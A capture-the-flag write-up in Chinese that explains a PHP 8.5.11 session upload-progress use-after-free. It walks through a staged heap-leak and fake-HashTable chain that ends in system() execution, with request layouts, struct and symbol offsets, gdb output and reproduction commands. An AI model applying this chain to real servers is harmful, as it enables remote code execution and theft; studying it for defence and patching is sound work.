# TPCTF 2026 决赛 · AUTHORED（DropVault）Writeup

> 目标：`http://<instance>/`，PHP 8.5.11 + Apache prefork 单 worker + `session.upload_progress` 全开。
> 结果：远程 RCE（`www-data`），读取 `/answers/flag` 并复制到 docroot 取回。
>
> **{{FLAG}}**

---

## 1. 题目与部署

附件是一个完整的部署包：

```
deploy/Dockerfile          FROM php:8.5.11-apache
deploy/php-dropvault.ini   memory_limit=16M  post_max_size=32M
                           session.upload_progress.enabled=On
                           session.upload_progress.cleanup=On
                           session.use_strict_mode=0
                           display_errors=On  error_reporting=E_ALL
deploy/mpm_prefork.conf    StartServers=MaxRequestWorkers=ServerLimit=1
                           KeepAlive Off，MaxConnectionsPerChild 0
src/upload.php             上传接口，扩展名白名单 txt/md/log/csv
src/status.php             打印 PHP 版本与 ini 活值
src/index.php / healthz.php
```

Dockerfile 里 `ln -s /answers/flag /flag`，flag 由平台注入 `/answers/flag`，只在服务器本地可读。

应用本身没有任何漏洞：`upload.php` 没有 `include`，落盘名是 `bin2hex(random_bytes(8)).'.'.ext`，路径完全不可控。**这是典型的“配置即漏洞”题**：单 worker + 16M 内存上限 + `session.upload_progress` 开启，正好命中 PHP 8.5.11 的 rfc1867/session 释放后使用。

`status.php` 远端实测与附件一致（PHP 8.5.11、apache2handler、16M/32M/32M、upload_progress 1/1、strict_mode 0）。

---

## 2. 漏洞根因

### 2.1 请求生命周期里的顺序问题

`php_request_startup()`（`main/main.c`）的顺序是：

```c
PG(modules_activated) = 0;          /* 1831：先清零 */
...
php_hash_environment();             /* 1873：这里解析 multipart！ */
zend_activate_modules();            /* 1874：模块 RINIT 在这之后 */
```

而 `session.upload_progress` 的 rfc1867 回调是在 **multipart 解析过程中**被调用的，也就是说：

> 会话回调执行时，`session` 模块的 RINIT（`php_rinit_session_globals()`）还没跑。

`php_rinit_session_globals()` 会把 `PS(id)` 置 NULL、`session_status` 置 none；它没跑，意味着回调里看到的 `PS(id)` 是**上一个请求残留下来的指针**。

### 2.2 OOM 让请求“跳过清理”

正常请求结束时 `php_request_shutdown()` 会调用各模块 RSHUTDOWN（`php_rshutdown_session_globals()` 负责 `zend_string_release_ex(PS(id))`）。但如果 multipart 解析里发生内存超限：

```
zend_mm_alloc_pages → zend_mm_safe_error("Allowed memory size of %zu bytes exhausted ...")
                     → longjmp(EG(bailout))
```

`php_request_shutdown()` 看到 `PG(modules_activated) == 0`，就**跳过所有模块 RSHUTDOWN**。于是：

* `PS(id)` 指向的 zend_string 已被释放（或即将被释放），但指针没清 → **悬垂指针**；
* `PS(send_cookie)`、`PS(session_status)` 等状态同样留在原处。

### 2.3 关键技巧：让 `PS(send_cookie)` 停在 1

`php_session_initialize()`（`ext/session/session.c:431`）的顺序：

```c
s_open();                                   /* 444 */
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {      /* 455：id 为空 */
    release 旧 id;
    s_create_sid();                         /* 460：生成新 id */
    if (PS(use_cookies)) PS(send_cookie)=1; /* 469 */
}
if (php_session_reset_id() == FAILURE) { abort; }   /* 487 */
```

`php_session_reset_id()` 里只有 `PS(send_cookie)` 为真时才调用 `php_session_send_cookie()`，成功后才把它清零：

```c
if (PS(use_cookies) && PS(send_cookie)) {   /* 1605 */
    if (php_session_send_cookie() == FAILURE) return FAILURE;  /* sc 不清零 */
    PS(send_cookie) = 0;                    /* 1610 */
}
```

所以只要让 `send_cookie` **失败**，`PS(send_cookie)` 就会永久停在 1，而 `PS(id)` 指向一个已经释放的字符串 —— 两个条件同时成立，下一次请求就会拿这个悬垂指针做 `ZSTR_VAL()/ZSTR_LEN()` 的越界读，并通过 `Set-Cookie` 把堆内容带回来。

失败条件非常容易制造：**`SG(headers_sent)` 为真**（`main/SAPI.c` 里 `sapi_add_header_ex` 会先检查）。而 PHP 在 `max_input_vars=1000` 被超过时会打一条 warning —— 这条 warning 已经把响应头发出去了：

```
Warning: PHP Request Startup: Input variables exceeded 1000. ...
Warning: PHP Request Startup: Session cookie cannot be sent after headers have already been sent ...
Fatal error: Allowed memory size of 16777216 bytes exhausted ...
```

于是“1. 超 max_input_vars → headers_sent；2. 发生 OOM”就成了一个稳定的武装原语（下称 **leak-A**）。

---

## 3. 利用链

整条链只用 HTTP，不需要 gdb、`/proc` 或外带监听。四个阶段：

| 阶段 | 作用 | 产出 |
|---|---|---|
| leak-A | 制造悬垂 `PS(id)` + `send_cookie=1` | 进程内状态 |
| stage1 | 伪造 zend_string 覆盖悬垂 id | heap chunk 基址 |
| stage2 | 伪 zend_array 的 `pDestructor` 覆盖 id 长度/数据 | libphp 基址 |
| stage3 | 伪 HashTable + 伪 `execute_data` | `system()` 执行 |

### 3.1 leak-A：武装悬垂状态

请求体（multipart/form-data）：

```
1001 个普通字段（如 f0000..f1000，值 1 字节）
PHPSESSID       = "\x00"
PHP_SESSION_UPLOAD_PROGRESS = "pwn"
f               = 文件部件（a.txt，64 字节）
999998          = 1 行 "x:" 头 × 53000（header-bomb）
```

* 1001 个变量 → `max_input_vars` 警告 → `headers_sent=1`；
* `PHPSESSID="\x00"` 让 `progress->sid` 为空值，`FILE_START` 分支不生效；
* 文件部件的 `FILE_START` 触发 `php_rinit_session(0)`（模块 RINIT 还没跑，这一步只清 `PS(id)/PS(mod_data)`）；
* header-bomb 每个 `x:` 行都会在解析期分配一条 zend_string + HashTable 桶（约 300 字节），53000 行 ≈ 16MB，正好在 **pre-RINIT** 阶段触发 OOM；
* OOM 的 `longjmp` 让 RSHUTDOWN 全部跳过 → `PS(id)`（新创建的会话 id）悬垂、`PS(send_cookie)=1`。

本地 gdb 实测（在 `php_session_initialize` 与 `zend_mm_safe_error` 下断）：

```
[init] mem0=16614376 id=(nil) sc=0
[oom ] mem0=16614640 id=0x7....7f000 sc=1
   #0 php_url_encode
   #1 php_session_reset_id
   #2 php_session_initialize
   #3 php_session_rfc1867_callback
   #4 rfc1867_post_handler
   #5 sapi_handle_post ...
```

`id` 的页内偏移恒为 **0x17f**（`chunk+0x17f000`，chunk 2MB 对齐），ASLR 只改 chunk 基址。

### 3.2 stage1：伪造 zend_string 泄漏 chunk

PHP 的 zend_string 是**柔性数组**，`val` 不存指针，`ZSTR_VAL(s) = (char*)s + 0x18` 是编译期算出来的：

```c
struct _zend_string {
    zend_refcounted_h gc;   /* +0x00 */
    zend_ulong        h;    /* +0x08 */
    size_t            len;  /* +0x10 */
    char              val[1];/* +0x18 */
};
```

所以只要让一段**可控字节**恰好落在 `chunk+0x17f000`，就能按下述布局伪造出“长度为 N 的字符串”，`php_url_encode(ZSTR_VAL(id), ZSTR_LEN(id))` 会把 `id+0x18` 起 N 个字节（越界进入后续堆）塞进 `Set-Cookie`：

```
+0x00  refcount = 0
+0x04  type_info = 0x16   (IS_STRING | IS_STR_INTERNED)
+0x08  h = 0
+0x10  len = 0x1000
+0x18  val[0] 必须是可打印字符（否则 initialize 走 create 分支重建 id）
```

stage1 的请求仍是 multipart：`PHPSESSID=attacksessionid0001` + `PHP_SESSION_UPLOAD_PROGRESS=pwn` + 841 个 48 字节字段 + **一个 `len=87` 的伪造值**（`b"A"*87`，在 0x10 写 `0x1000`、在 0x18 写 `L`）。这个 87 字节块落进悬垂 id 所在的 bin 之后，`Set-Cookie` 变成 4096 字节。

解析 cookie 的方法：把每个 8 字节按小端读出，落在 `0x100000000000..0x800000000000` 区间的值按 `& ~0x1FFFFF` 归并，多数票就是 chunk 基址。

### 3.3 stage2：泄漏 libphp

第二阶段换一个形状：重新 leak-A 武装（这次 1001 个字段的值用 39 字节，用于对齐），然后发 983 个嵌套字段 `aNNNN[j]`，其中**第 406 个字段带 16 个元素**。这样一个 `zend_array` 结构会落在悬垂 id 处，于是 `ZSTR_LEN(id)` 读到数组的 `nTableSize`，`ZSTR_VAL(id)` 读到数组里的 `arData` 指针：

```
+0x00  gc (refcount/type)
+0x08  nTableMask
+0x10  nNumUsed / nNumOfElements
+0x18  arData          ← 这就是 cookie 里 offset 8 处的指针
```

cookie 前 8 字节的低 12 位等于 `zval_ptr_dtor & 0xfff`（本环境 `0x7a0`）时即可确认，`libphp = 值 - 0x7b47a0`。

### 3.4 stage3：伪造 HashTable 调 system()

重复 leak-A，把 `PS(http_session_vars)`（一个 zend_reference）也做成悬垂（arm 阶段用的是 `PHPSESSID="a"*100` + 107 个小 pad + 文件 + header-bomb）。然后在 fire 请求里：

* 8 个 100 字节 mask；
* 80 个 31 字符名、1 字节值的填充；
* **200 个 31 字节 live carrier**，内容等价于：

```c
refcount=1, type=IS_REFERENCE(10)
val.value = htdata                 /* 指向伪造 HashTable */
val.type  = 0x307                  /* IS_ARRAY | IS_REFERENCE */
sources   = 0
```

* 最后是一个 **167 字节的伪 `zend_array`**，关键字段：

```
+0x00  gc.refcount=1, gc.type=IS_ARRAY(7)
+0x08  flags=0x10, nTableMask=0xFFFFFFF8
+0x10  arData = htdata+0x20        /* 即伪 execute_data */
+0x18  nNumUsed=nNumOfElements=1
+0x20  nTableSize=8
+0x30  pDestructor = zif_system    /* ← 触发点 */
      (0x20 处同时是 execute_data：return_value=zif_system,
       num_args=1, arg1.value=htdata+0x80, arg1.type=IS_STRING)
+0x80  伪 zend_string: refcount=1, type=0x106, len=len(cmd)
+0x98  cmd                        /* 最多 14 字节 */
```

`htdata` 是编译期常量：`htdata = chunk + 0x7e0d8`（伪造 HashTable 在 chunk 内的固定偏移）。

当 PHP 对该数组执行析构时，`pDestructor` 被当作 `zif_system` 调用，参数来自伪 `execute_data` 的 arg1，于是执行命令。命令长度受 167 字节载体限制（14 字节），足够 `cp /flag y` 这类短命令。

---

## 4. 本地调试记录（gdb）

在本地用同一个镜像跑 `dv2`（`--cap-add=SYS_PTRACE --security-opt seccomp=unconfined`），`libphp.so` 带符号表，关键偏移：

| 符号 | 偏移 |
|---|---|
| `zif_system` | `0x5996e0` |
| `zval_ptr_dtor` | `0x7b47a0` |
| `ps_globals` | `0x1771a40` |
| `php_session_initialize` | `0x5469d0` |
| `php_session_reset_id` | `0x545ac0` |
| `php_session_rfc1867_callback` | `0x546700` 区 |
| `ps_open_files` / `ps_close_files` / `ps_files_open` | `0x548b80` / `0x548b00` / `0x549250` |
| `zend_mm_safe_error` / `zend_error_noreturn` | `0x1c3a90` / `0x1e8dd6` |

调试要点：

* `break *base+0x5469d0` 打印 `PS(id)`（`ps_globals+0x10`）、`PS(mod_data)`（`+0x60`）、`PS(send_cookie)`（`+0x15e`）；
* `pkill gdb` 会把 `int3` 留在目标进程里，之后再断到同一地址就 SIGTRAP，必须 `docker restart`；
* 断点会改变时序（A 阶段的 OOM 路径会因此提前把 worker 打死），所以 B 阶段要么不带断点、要么等 A 发完再 attach。

顺带确认了一个“此路不通”的细节：在只走 `MULTIPART_EVENT_END → php_session_rfc1867_cleanup → php_session_initialize` 的路径上，`ps_open_files()` 里的 `ecalloc(0x28)` 会**总是**返回上一请求遗留的 `PS(mod_data)` 同一地址，随后 `ps_close_files()` 把刚建好的结构自己释放掉；等 `s_read` 走 `ps_files_open()` 时 `basedir` 已被 `Set-Cookie` 的 llist 桶（同属 40 字节 bin）覆盖成 0，`php_session_abort → s_close → ps_close_files+0x39` 直接 SIGSEGV。这也是为什么单纯“伪造 id + 等 END 发 cookie”在 mod_php 上行不通，必须让 OOM 发生在 header 入队之后、`s_read` 之前 —— 正是 3.1 用 header-bomb 制造的效果。

---

## 5. 远端标定

远端与本地镜像同版本（Apache 2.4.69 / PHP 8.5.11），但堆布局差 8 字节，直接套本地参数会把 worker 打崩，需要按远端实测微调：

* stage1 的伪造值长度：**87 字节**（本地是 79）；
* stage2 的 fill：39 字节、数组下标 406；
* 实测泄漏结果：

```
chunk  = 0x743ffbe00000        (4096 字节 cookie，81 票)
libphp = 0x743ffda00000        (cookie[8:16] = 0x743ffe1b47a0 = zval_ptr_dtor)
zif    = 0x743ffdf996e0        (= libphp + 0x5996e0)
htdata = 0x743ffbe7e0d8        (= chunk + 0x7e0d8)
```

fire 阶段执行 `cp /flag y`（10 字节），`/var/www/html` 对 `www-data` 可写（镜像默认 1777），随后：

```bash
$ curl -s http://<instance>/y
{{FLAG}}
```

> 注：`/flag` 是 `/answers/flag` 的符号链接，`cp` 默认跟随链接，复制的是真实内容。

---

## 6. 复现步骤

```bash
# 0. 起本地靶机（deploy/ 目录下）
echo 'local-test-secret' > secret.txt
docker compose up -d --build          # 映射到 127.0.0.1:18080

# 1. 验证配置
curl -s http://127.0.0.1:18080/status.php | grep -E 'memory|upload_progress|use_strict'

# 2. leak-A（武装）
python3 leak_a.py http://127.0.0.1:18080/upload.php
#   期望：响应里出现 "Input variables exceeded 1000" 与
#        "Session cookie cannot be sent after headers have already been sent"

# 3. stage1 / stage2（泄漏 chunk 与 libphp）
python3 leak.py http://127.0.0.1:18080/upload.php
#   chunk  = 0x...            (4096 字节 Set-Cookie 多数票)
#   libphp = 0x...            (cookie[8:16] - 0x7b47a0)

# 4. fire
python3 fire.py http://127.0.0.1:18080/upload.php <chunk> <libphp> 'cp /flag y'
curl -s http://127.0.0.1:18080/y
```

关键脚本（`work/` 目录）：

* `fastwp.py` —— leak-A / stage1 / stage2 / fire 的构造与解析；
* `leak_both.py` —— 一轮拿 chunk + libphp；
* `fire.py` —— 伪 HashTable + carrier 的最终 RCE；
* `diag_remote.py` / `maxvars.py` —— 远端状态探针（确认 `headers_sent`、`max_input_vars`）。

---

## 7. 修复建议

* 官方修复：升级到 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12；
* 临时缓解：`session.upload_progress.enabled=Off`（本题只要关掉它，整条链失效）；
* 加固：`display_errors=Off`（避免 OOM 时的 fatal 输出顺带 flush 已入队的 header）、限制 `max_input_vars`、给 worker 设 `MaxRequestWorkers>1` 并不能修复 UAF，只是降低可用性影响。

---

## 附录 A：结构布局速查

```c
/* zend_string (PHP 8.x, 64bit) */
0x00  zend_refcounted_h gc;   // refcount(u32) | type_info(u32)
0x08  zend_ulong h;
0x10  size_t len;
0x18  char val[1];            // 柔性数组，ZSTR_VAL = s+0x18

/* zend_array */
0x00  gc; 0x08 nTableMask; 0x0C nNumUsed; 0x10 nNumOfElements;
0x14  nTableSize; 0x18 arData; 0x20 nInternalPointer;
0x28  nNextFreeElement; 0x30 pDestructor;

/* zend_execute_data（用于伪造调用帧） */
0x00  opline/fs 相关; 0x10 return_value(这个偏移在本题用作 return_value 槽);
0x2C  num_args; 0x50 arg1.value; 0x58 arg1.type;
```

```c
/* ps_files（session save handler "files"） */
0x00 last_key; 0x08 basedir; 0x10 dirdepth; 0x18 st_size; 0x20 filemode; 0x24 fd;
```

```c
/* ps_globals 关键字段 */
+0x10 PS(id); +0x50 PS(mod); +0x60 PS(mod_data); +0x68 PS(session_status); +0x15e PS(send_cookie);
```
